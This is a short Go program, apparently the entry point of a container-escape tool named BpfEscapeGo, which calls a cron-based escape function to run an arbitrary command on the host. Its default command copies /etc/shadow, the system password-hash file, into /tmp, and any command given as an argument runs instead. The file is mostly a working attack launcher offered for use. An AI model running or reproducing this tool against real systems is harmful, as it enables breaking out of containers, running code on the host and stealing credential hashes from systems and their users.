package main

import (
	"os"

	"github.com/awslshadowstar/BpfEscapeGo/pkg/cron"
)

func main() {
	if len(os.Args) < 2 {
		cron.EscapeByCron("cat /etc/shadow > /tmp/hello")
	} else {
		cron.EscapeByCron(os.Args[1])
	}
}
